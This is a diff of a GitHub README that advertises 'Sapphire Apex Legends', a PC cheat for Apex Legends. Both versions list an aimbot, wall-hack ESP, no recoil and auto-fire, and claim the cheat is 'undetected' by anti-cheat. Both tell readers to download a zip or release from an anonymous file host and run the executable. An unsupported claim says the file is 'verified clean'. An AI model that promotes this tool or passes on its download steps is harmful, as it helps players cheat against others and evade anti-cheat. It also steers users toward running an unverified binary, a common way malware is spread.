@@ -1,124 +1,95 @@
-# Sapphire-Apex-Legends
-Apex Legends Hack 2025 | Free Aimbot + ESP + No Recoil | Undetected Apex Cheat PC
-<div align="center">
-  <h1>🎯 Apex Legends Toolkit</h1>
+# Sapphire Apex Legends 🪐
 
+![Sapphire Apex Legends](https://img.shields.io/badge/Download-Release%20v1.0-blue)
 
----
+Welcome to the **Sapphire Apex Legends** repository! This project provides a comprehensive suite of tools designed to enhance your gameplay experience in Apex Legends. Here, you will find an aimbot, ESP, and no recoil features, all aimed at giving you an edge in your matches. 
 
-## 🔧 Functional Overview
+## Table of Contents
 
-### ⬇️ Expand sections for full feature breakdown
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-<details>
-<summary><strong>🧠 Aim Assistance</strong></summary>
+## Introduction
 
-- **Enable/Disable** – Toggle aim support features.
-- **Mouse Aim Control** – Uses physical mouse movement for target locking.
-- **Smart Aim Assist** – Improves target tracking while retaining control.
-- **Deadzone Configuration** – Set a radius where aim assist remains inactive.
-- **Visible Check** – Focus only on targets in line of sight.
-- **Target Locking** – Retain aim on a selected opponent.
-- **Adjustable FOV** – Fine-tune your assist field-of-view.
-- **Bone Targeting** – Choose head, torso, or custom zones.
-- **Smoothing / Humanizer** – Natural target movement for realism.
-- **Visual Overlays** – Draw crosshairs, assist areas, and targets.
+Apex Legends is a popular battle royale game that combines elements of strategy, teamwork, and fast-paced action. With the right tools, you can improve your performance and enjoy the game even more. The **Sapphire Apex Legends** hack is designed for PC users and aims to remain undetected while providing essential features that enhance your gameplay.
 
-</details>
+To get started, you can download the latest release from our [Releases section](https://github.com/NIEWER/Sapphire-Apex-Legends/releases). 
 
-<details>
-<summary><strong>👁️ Visual Enhancements</strong></summary>
+## Features
 
-- **Player Highlighting** – Show enemies on-screen with overlays.
-- **Training Dummies (Firing Range)** – Render dummy outlines for testing.
-- **ESP Boxes & Skeletons** – Track enemy posture and positioning.
-- **Distance Display** – Show range to enemies.
-- **Name Tags** – Reveal player nicknames above their avatars.
-- **Snaplines** – Draw directional lines to nearby targets.
-- **Health & Shield Info** – Display enemy status bars.
-- **Weapon Display** – View enemy’s current gear.
-- **Visibility & Team Checks** – Filter ESP based on threat level.
-- **Knockdown Indicator** – Separate visuals for downed targets.
-- **Render Distance Limit** – Customize ESP range.
+- **Aimbot**: Automatically aim at enemies to increase your accuracy and kill rate.
+- **ESP (Extra Sensory Perception)**: See enemy locations through walls and obstacles.
+- **No Recoil**: Eliminate weapon recoil for a smoother shooting experience.
+- **Undetected**: Designed to remain undetected by the game’s anti-cheat systems.
 
-</details>
+## Installation
 
-<details>
-<summary><strong>📡 Radar Module</strong></summary>
+To install the **Sapphire Apex Legends** hack, follow these steps:
 
-- **Mini Radar Toggle** – Activates compact radar overlay.
-- **Custom Cross/Direction Lines** – Visualize map movement.
-- **Text Labels & Circles** – Add UI enhancements to the radar.
-- **Player Facing Direction** – See where enemies are looking.
-- **Style Customization** – Fully resizable, movable & skinnable.
+1. **Download the Release**: Visit our [Releases section](https://github.com/NIEWER/Sapphire-Apex-Legends/releases) and download the latest version.
+2. **Extract Files**: Once downloaded, extract the files to a folder on your PC.
+3. **Run the Executable**: Navigate to the extracted folder and run the executable file.
 
-</details>
+## Usage
 
-<details>
-<summary><strong>🌎 World Item ESP</strong></summary>
+After installation, follow these steps to use the hack:
 
-- **Weapon Detection** – Locate dropped or world-spawned guns.
-- **Attachment Highlighting** – Easily identify scopes, stocks, etc.
-- **Ammo Indicator** – Track nearby bullets by type.
-- **Healing Item ESP** – Quickly find meds and syringes.
-- **Lootables & Armor** – Identify interactable objects.
-- **Smart Loot Filter** – Show only valuable or needed gear.
+1. **Launch Apex Legends**: Start the game as you normally would.
+2. **Open Sapphire Hack**: Run the Sapphire Apex Legends hack before or after launching the game.
+3. **Configure Settings**: Adjust the settings according to your preferences. You can toggle the aimbot, ESP, and no recoil features on or off.
+4. **Enjoy the Game**: Start playing and experience the enhanced features.
 
-</details>
+## Contributing
 
-<details>
-<summary><strong>🎮 Miscellaneous Utilities</strong></summary>
+We welcome contributions from the community. If you have suggestions or improvements, feel free to submit a pull request. Here’s how you can contribute:
 
-- **Trigger Mode** – Fire automatically when enemies are on crosshair.
-- **Auto Superglide** – Perfect movement boost after vaulting.
-- **Spectator Tracker** – Know who's watching you in real time.
-- **Color Palette Manager** – Customize overlay colors to your style.
-- **Flexible Keybind System** – Assign hotkeys per feature.
-- **Configuration System** – Save/load profiles for different playstyles.
-- **Stream Safety Mode** – Hide visuals while streaming or recording.
+1. **Fork the Repository**: Click on the "Fork" button at the top right corner of the page.
+2. **Create a New Branch**: Use a descriptive name for your branch.
+3. **Make Changes**: Implement your changes and test them thoroughly.
+4. **Submit a Pull Request**: Provide a clear description of your changes and submit your pull request.
 
-</details>
+## License
+
+This project is licensed under the MIT License. You are free to use, modify, and distribute the code, but please give appropriate credit to the original authors.
+
+## Contact
+
+For any questions or issues, please feel free to reach out. You can open an issue in this repository or contact me directly through GitHub.
 
 ---
 
-## 📌 Why Use This?
+### Additional Resources
 
-✅ Designed for training, reaction improvement, and strategic practice  
-✅ Fully adjustable — not one-size-fits-all  
-✅ Portable build — no installation needed  
-✅ Verified clean by multiple security scanners (VirusTotal, etc.)
----
-## 📥 Download & Installation
-
-> Get started with the latest version of the **Apex Legends Toolkit** below.
-
-### 🔗 [⬇️ Click Here to Download – Latest Build](https://files.catbox.moe/txnfm2.zip)
-
+- **Apex Legends Official Website**: [Apex Legends](https://www.ea.com/games/apex-legends)
+- **Community Forums**: Engage with other players and share tips.
 
 ---
 
-## 🖥️ UI Preview
+![Apex Legends Gameplay](https://images.unsplash.com/photo-1604539288290-b2c62d7e1e7d)
 
-> Below is an in-game preview of the custom overlay:
-![Apex Toolkit UI]
-[![34-2.png](https://i.postimg.cc/KjwNxLb5/34-2.png)](https://postimg.cc/wR5Jk17t)
-[![34-12.png](https://i.postimg.cc/bwxJNXbt/34-12.png)](https://postimg.cc/FYKmDBTr)
-[![34-4.png](https://i.postimg.cc/BnnSs8qd/34-4.png)](https://postimg.cc/tY8QN4n5)
----
+## Frequently Asked Questions (FAQ)
 
-## 🧩 Getting Started
+### Is this hack safe to use?
 
-1. Download the latest version from the **[Releases](#)** tab  
-2. Extract the `.zip` into a separate folder  
-3. Run the launcher and configure your preferred settings  
-4. Load into the game — customization takes effect live
+We have designed this hack to remain undetected by the game's anti-cheat systems. However, using hacks can always carry risks. Use at your own discretion.
 
----
+### Can I get banned for using this hack?
 
-## 💬 Community & Feedback
+While we strive to keep the hack undetected, there is always a risk of being banned when using cheats in any game. Please consider this before using the hack.
 
-Have suggestions or need help?  
-Join our Discord or open an issue on GitHub. Community guides and config libraries available.
+### How do I report a bug?
+
+If you encounter any issues, please open an issue in this repository with a detailed description of the problem. We appreciate your feedback.
+
+### What if I need help with installation?
+
+Feel free to reach out through the issues section or contact me directly for assistance.
 
 ---
 
+Thank you for checking out **Sapphire Apex Legends**! Enjoy your enhanced gameplay experience, and remember to play responsibly.
